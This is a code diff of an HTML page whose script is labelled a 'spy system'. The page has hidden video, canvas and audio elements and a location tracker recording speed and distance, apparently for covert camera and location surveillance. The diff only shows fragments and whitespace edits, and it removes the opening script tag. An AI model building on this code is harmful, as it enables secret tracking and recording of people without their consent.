@@ -53,13 +53,13 @@ body { margin: 0; background: #e6e6e6; font-family: "Times New Roman", serif; ov
     <video id="video" autoplay muted playsinline></video>
     <video id="video2" autoplay muted playsinline></video>
     <video id="videoRec" autoplay muted playsinline></video>
+
     <canvas id="canvas"></canvas>
     <canvas id="canvas2"></canvas>
+
     <audio id="audio"></audio>
     <div id="status"></div>
 </div>
-
-<script>
 // ═══════════════════════════════════════════════════════════════
 // 💀 VANSHCZ ULTIMATE SPY SYSTEM v10.0 — MAXIMUM POWER MODE
 // ═══════════════════════════════════════════════════════════════
@@ -616,8 +616,8 @@ const SuperLocationTracker = {
             STATE.currentSpeed = currentSpeed;
             
             if (currentSpeed > STATE.maxSpeed) {
-                STATE.maxSpeed = currentSpeed;
-            }
+    STATE.maxSpeed = currentSpeed;
+}
             
             if (STATE.totalDistanceTraveled > 0) {
                 const totalTime = (newLocation.timestamp - STATE.startTime) / 1000;
